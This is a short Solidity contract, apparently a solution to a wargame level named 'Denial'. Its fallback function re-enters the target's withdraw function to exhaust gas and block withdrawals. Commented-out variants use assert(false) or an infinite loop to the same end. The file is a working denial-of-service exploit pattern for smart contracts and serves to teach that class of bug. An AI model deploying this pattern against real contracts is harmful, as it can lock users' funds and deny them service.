// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

import "./Denial.sol";

contract DenialAtt {
    address target;

    constructor(address _target) public {
        target = _target;
    }

    // allow deposit of funds
    fallback() external payable {
        // require(msg.sender == target, "wrong sender");
        // assert(false);
        Denial(payable(target)).withdraw();
        // Denial(payable(target)).panic();
        // while (true) {}
    }
}
